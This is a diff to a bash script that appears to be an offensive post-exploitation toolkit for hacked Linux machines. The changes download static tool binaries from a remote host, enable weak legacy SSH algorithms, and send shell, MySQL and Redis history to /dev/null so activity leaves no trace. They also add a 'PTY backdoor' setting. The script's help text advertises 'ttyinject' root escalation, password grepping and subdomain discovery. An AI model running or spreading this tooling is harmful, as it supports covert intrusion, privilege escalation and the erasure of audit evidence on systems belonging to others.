@@ -616,7 +616,8 @@ bin() {
         echo -e ".....[${CDG}OK${CDM}]${CN}"
     }
 
-    bin_dl anew         "https://bin.ajam.dev/${a}/anew-rs"
+    # bin_dl anew         "https://bin.ajam.dev/${a}/anew-rs" # fuck anew-rs, it needs argv[1] and is not compatible.
+    bin_dl anew         "https://bin.ajam.dev/${a}/anew"
     bin_dl awk          "https://bin.ajam.dev/${a}/Baseutils/gawk/gawk"
     # bin_dl awk          "https://bin.ajam.dev/${a}/awk"
     bin_dl base64       "https://bin.ajam.dev/${a}/Baseutils/coreutils/base64"
@@ -1177,8 +1178,8 @@ ${CY}>>>>> ${CDC}curl -obash -SsfL 'https://bin.ajam.dev/$(uname -m)/bash && chm
         HS_SSH_OPT+=("-oUserKnownHostsFile=/dev/null")
         # Even if 'ssh -Q' shows the key it sometimes complains that it cant use them.
         # User can set SSH_NO_OLD before hs to disable old ciphers.
-        [ -z "$SSH_NO_OLD" ] && [[ "$(\ssh -Q kex)" == *"diffie-hellman-group1-sha1"* ]] && HS_SSH_OPT+=("-oKexAlgorithms=+diffie-hellman-group1-sha1")
-        [ -z "$SSH_NO_OLD" ] && [[ "$(\ssh -Q key)" == *"ssh-dss"* ]] && HS_SSH_OPT+=("-oHostKeyAlgorithms=+ssh-dss")
+        [ -z "$SSH_NO_OLD" ] && \ssh -oKexAlgorithms=+diffie-hellman-group1-sha1 -V 2>/dev/null && HS_SSH_OPT+=("-oKexAlgorithms=+diffie-hellman-group1-sha1")
+        [ -z "$SSH_NO_OLD" ] && \ssh -oHostKeyAlgorithms=+ssh-dss -V 2>/dev/null && HS_SSH_OPT+=("-oHostKeyAlgorithms=+ssh-dss")
         HS_SSH_OPT+=("-oConnectTimeout=5")
         HS_SSH_OPT+=("-oServerAliveInterval=30")
     }
@@ -1252,16 +1253,19 @@ hs_init_alias() {
 }
 
 hs_init_shell() {
-    unset HISTFILE LC_TERMINAL LC_TERMINAL_VERSION
-    [ -n "$BASH" ] && export HISTFILE="/dev/null"
+    unset LC_TERMINAL LC_TERMINAL_VERSION
+    # Some old bash log to default location if HISTFILE is not set. Force to /dev/null
+    export HISTFILE="/dev/null"
     export BASH_HISTORY="/dev/null"
-    history -c 2>/dev/null
+    #history -c 2>/dev/null
     export LANG=en_US.UTF-8
     locale -a 2>/dev/null|grep -Fqim1 en_US.UTF || export LANG=en_US
     export LESSHISTFILE=-
     export REDISCLI_HISTFILE=/dev/null
     export MYSQL_HISTFILE=/dev/null
     export T=.$'\t''~?$?'".${UID}"
+    # PTY backdoor to not sniff when using sudo/su.
+    export LC_PTY=1
     TMPDIR="/tmp"
     [ -d "/var/tmp" ] && TMPDIR="/var/tmp"
     [ -d "/dev/shm" ] && TMPDIR="/dev/shm"
@@ -1312,7 +1316,7 @@ ${CDC} ctime <file>                          ${CDM}Set ctime to file's mtime ${C
 ${CDC} ttyinject                             ${CDM}Become root when root switches to ${USER:-this user}
 ${CDC} wfind <dir> [<dir> ...]               ${CDM}Find writeable directories
 ${CDC} hgrep <string>                        ${CDM}Grep for pattern, output for humans ${CN}${CF}[hgrep password]
-${CDC} find_subdomains .foobar.com            ${CDM}Search files for sub-domain
+${CDC} find_subdomains .foobar.com           ${CDM}Search files for sub-domain
 ${CDC} crt foobar.com                        ${CDM}Query crt.sh for all sub-domains
 ${CDC} dns foobar.com                        ${CDM}Resolv domain name to IPv4
 ${CDC} rdns 1.2.3.4                          ${CDM}Reverse DNS from multiple public databases
